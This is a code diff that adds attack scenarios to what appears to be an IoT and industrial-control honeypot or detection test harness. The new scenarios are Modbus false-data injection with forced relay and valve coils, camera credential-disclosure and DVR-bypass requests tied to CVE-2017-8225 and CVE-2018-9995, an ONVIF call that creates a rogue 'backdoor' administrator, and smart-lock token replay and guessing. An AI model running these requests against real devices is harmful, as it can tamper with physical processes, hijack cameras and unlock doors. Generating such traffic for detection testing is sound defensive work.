@@ -438,6 +438,49 @@ def scn_modbus(cfg):
         log("modbus", f"modbus error: {e}")
 
 
+def scn_modbus_falsedata(cfg):
+    log("falsedata", "Modbus false-data injection + actuator force (ICS manipulation of control)")
+    try:
+        s = socket.create_connection((cfg.modbus_host, cfg.modbus_port), timeout=6)
+        s.settimeout(6)
+        _modbus_txn(s, struct.pack(">BHH", 6, 0, 240))        # inject temperature = 24.0 (mask alarms)
+        _modbus_txn(s, struct.pack(">BHH", 6, 1, 1013))       # inject pressure = 101.3
+        _modbus_txn(s, struct.pack(">BHH", 5, 1, 0xFF00))     # force relay ON (actuator)
+        _modbus_txn(s, struct.pack(">BHH", 5, 2, 0x0000))     # force valve OFF (actuator)
+        s.close()
+        log("falsedata", "injected telemetry regs 40001/40002 and forced coils 1/2")
+    except Exception as e:
+        log("falsedata", f"modbus error: {e}")
+
+
+def scn_camera_disclosure(cfg):
+    log("camdisc", "camera credential disclosure + DVR bypass + ONVIF rogue admin")
+    base = f"http://{cfg.http_host}:{cfg.http_port}"
+    http_get(f"{base}/system.ini?loginuse&loginpass")                       # CVE-2017-8225
+    http_get(f"{base}/device.rsp?opt=user&cmd=list",
+             headers={"Cookie": "uid=admin"})                              # CVE-2018-9995
+    http_get(f"{base}/onvif/device_service", method="POST",
+             data=b"<GetDeviceInformation/>",
+             headers={"Content-Type": "application/soap+xml"})             # ONVIF probe
+    http_get(f"{base}/onvif/device_service", method="POST",
+             data=b"<CreateUsers><User><Username>backdoor</Username>"
+                  b"<Password>pwn</Password><UserLevel>Administrator</UserLevel></User></CreateUsers>",
+             headers={"Content-Type": "application/soap+xml"})             # ONVIF rogue admin
+
+
+def scn_token(cfg):
+    log("token", "smart-lock API token replay + token guessing")
+    base = f"http://{cfg.lock_host}:{cfg.lock_port}"
+    # replay: present the real token (as if stolen from config.json) with no prior auth
+    real = "a1b2c3d4e5f60718293a4b5c6d7e8f90"
+    http_get(f"{base}/api/v1/lock?token={real}", data=b'{"action":"unlock"}',
+             headers={"Content-Type": "application/json"})
+    # guessing: several wrong tokens
+    for i in range(6):
+        http_get(f"{base}/api/v1/status?token=deadbeef{i:024x}")
+        jitter(0.05, 0.15)
+
+
 def scn_benign(cfg):
     log("benign", "single banner grab + immediate disconnect")
     banner_grab(cfg.host, cfg.telnet_port)
@@ -448,7 +491,8 @@ SCENARIOS = {
     "scan": scn_scan, "brute": scn_brute, "stuffing": scn_stuffing, "payload": scn_payload,
     "discovery": scn_discovery, "c2": scn_c2, "webscan": scn_webscan, "ics": scn_ics,
     "camera": scn_camera, "postexploit": scn_postexploit, "exploit": scn_exploit,
-    "modbus": scn_modbus, "benign": scn_benign,
+    "modbus": scn_modbus, "falsedata": scn_modbus_falsedata, "camdisc": scn_camera_disclosure,
+    "token": scn_token, "benign": scn_benign,
 }
 
 
